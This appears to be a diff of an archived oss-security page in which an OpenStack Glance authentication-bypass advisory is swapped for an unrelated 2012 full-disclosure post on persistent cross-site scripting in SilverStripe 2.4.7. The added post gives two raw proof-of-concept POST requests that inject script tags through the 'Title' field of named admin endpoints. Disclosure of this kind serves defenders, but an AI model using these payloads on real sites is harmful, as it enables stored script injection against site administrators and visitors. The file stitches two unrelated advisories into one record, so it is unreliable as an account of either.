@@ -1,72 +1,106 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/11/09/5
-Message-ID: <509D0E8D.1070307@redhat.com>
-Date: Fri, 09 Nov 2012 09:09:17 -0500
-From: Russell Bryant <rbryant@...hat.com>
-To: oss-security@...ts.openwall.com
-Subject: [OSSA 2012-017.1] Authentication bypass for image deletion (CVE-2012-4573, CVE-2012-5482) ERRATA 1
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/10/14/2
+Message-ID: <CAPYM6Vz4YyCUBodE8Dj7Xw7qM_1EBLBFj02uZsWp9HRtLt11rQ@mail.gmail.com>
+Date: Mon, 15 Oct 2012 00:38:52 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
+Subject: SilverStripe CMS 2.4.7 <= Persistent Cross Site Scripting Vulnerability
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+1. OVERVIEW
 
-OpenStack Security Advisory: 2012-017 (ERRATA 1)
-CVE: CVE-2012-4573, CVE-2012-5482
-Date: November 9, 2012
-Title: Authentication bypass for image deletion
-Impact: High
-Reporter: Gabe Westmaas (Rackspace)
-Products: Glance
-Affects: Essex, Folsom, Grizzly
+SilverStripe 2.4.7 and lower versions are vulnerable to Persistent
+Cross Site Scripting.
 
-Description:
-Gabe Westmaas from Rackspace reported a vulnerability in Glance
-authentication of image deletion requests. Authenticated users may be
-able to delete arbitrary, non-protected images from Glance servers. All
-Folsom and Grizzly deployments are affected. Additionally, Essex
-deployments that use the delayed_delete option are also affected.
 
-Fixes:
-Grizzly:
+2. BACKGROUND
 
-https://github.com/openstack/glance/commit/6ab0992e5472ae3f9bef0d2ced41030655d9d2bc
+SilverStripe CMS is easy for both developers and content authors to
+work with. The SilverStripe Framework keeps the code tucked away
+neatly so that it can be accessed easily by programmers but does not
+get in the way of content authors.
 
-https://github.com/openstack/glance/commit/b591304b8980d8aca8fa6cda9ea1621aca000c88
-2012.2 (Folsom):
 
-https://github.com/openstack/glance/commit/90bcdc5a89e350a358cf320a03f5afe99795f6f6
+3. VULNERABILITY DESCRIPTION
 
-https://github.com/openstack/glance/commit/fc0ee7623ec59c87ac6fc671e95a9798d6f2e2c3
-2012.1 (Essex):
+The "Title" parameter was not properly sanitized upon submission to
+"/index.php/admin/security/EditForm/field/Roles/AddForm" and
+"/index.php/admin/RootForm" urls, which allows attacker to conduct
+Cross Site Scripting attack. This may allow an attacker to create a
+specially crafted URL that would execute arbitrary script code in a
+victim's browser.
 
-https://github.com/openstack/glance/commit/efd7e75b1f419a52c7103c7840e24af8e5deb29d
 
-References:
-    http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-4573
-    http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-5482
-    https://bugs.launchpad.net/glance/+bug/1065187
-    https://bugs.launchpad.net/glance/+bug/1076506
+4. VERSIONS AFFECTED
 
-Notes:
-This fix will be included in the grizzly-1 development milestone and in
-a future 2012.2 (Folsom) release.
+Tested on 2.4.7
 
-OSSA History:
-2012-11-09 - Errata 1
-  - Updated to reflect that the v2 API in Folsom and Grizzly was also
-    affected
-  - Include links to fixes for the v2 API
-  - Added CVE-2012-5482 for the vulnerability against the v2 API
-2012-11-07 - Original Version
 
-- -- 
-Russell Bryant
-OpenStack Vulnerability Management Team
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
-Comment: Using GnuPG with Mozilla - http://www.enigmail.net/
+5. PROOF-OF-CONCEPT/EXPLOIT
 
-iEYEARECAAYFAlCdDo0ACgkQFg9ft4s9SAZ9AQCfT/q3DFPRE5Vj3UtluqeQfYQB
-PqYAoK/QykvsE7TvtGNJw3XVBqsuDj+A
-=MiA4
------END PGP SIGNATURE-----
+////////////////////////////////////////
+POST /index.php/admin/security/EditForm/field/Roles/AddForm?SecurityID=[ID]
+HTTP/1.1
+Host: localhost
+Referer: http://localhost/index.php/admin/security/EditForm/field/Roles/add?SecurityID=[ID]
+Cookie: PHPSESSID=1e4ea938f83b04bc826231987cedc050;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+Title=%27%22%3E%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&ctf%5BClassName%5D=PermissionRole&SecurityID=[ID]&action_saveComplexTableField=Save
+
+
+POST /index.php/admin/RootForm HTTP/1.1
+Host: localhost
+Proxy-Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.4.0_rc3
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Referer: http://localhost/index.php/admin/
+Content-Length: 256
+Cookie: PHPSESSID=25c8f4060c398d05732fe494eb3ad4f1;
+Pragma: no-cache
+Cache-Control: no-cache
+
+Title='%22%3E%3Cscript%3Ealert(%2Fxss1%2F)%3C%2Fscript%3E&Tagline=test&CanViewType=Anyone&ViewerGroups=&CanEditType=LoggedInUsers&EditorGroups=&CanCreateTopLevelType=LoggedInUsers&CreateTopLevelGroups=&SecurityID=[ID]&Theme=&ajax=0&action_save_siteconfig=1
+////////////////////////////////////////
+
+
+6. SOLUTION
+
+Upgrade to the latest 3.x version.
+
+
+7. VENDOR
+
+SilverStripe Development Team
+http://www.silverstripe.org/
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2012-02-06: notified vendor
+2012-10-15: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/%5BSilverStripe_2.4.7%5D_xss
+
+
+#yehg [2012-10-15]
+
+---------------------------------
+Best regards,
+YGN Ethical Hacker Group
+Yangon, Myanmar
+http://yehg.net
+Our Lab | http://yehg.net/lab
+Our Directory | http://yehg.net/hwd
